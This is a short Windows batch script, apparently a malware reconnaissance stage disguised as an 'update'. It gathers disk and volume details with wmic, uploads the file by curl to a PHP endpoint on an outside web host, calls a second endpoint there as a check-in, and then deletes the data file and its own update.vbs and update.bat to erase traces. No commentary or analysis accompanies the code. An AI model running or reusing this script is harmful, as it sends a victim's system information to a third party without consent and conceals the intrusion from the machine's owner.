@echo off
setlocal enabledelayedexpansion


wmic logicaldisk get volumename,description,caption,size,freespace > wmic.data
timeout -t 5 /nobreak
curl -X POST -H "Content-Type: multipart/form-data" -F "name=user2" -F "data=@%~dp0wmic.data" http://peace.postech.ac.kr/shop/data/brand/2021/brand.php

del /f /q wmic.data
curl -s -o nul "http://peace.postech.ac.kr/shop/data/item/2022/item.php?a=1"
del /f /q update.vbs
del /f /q update.bat
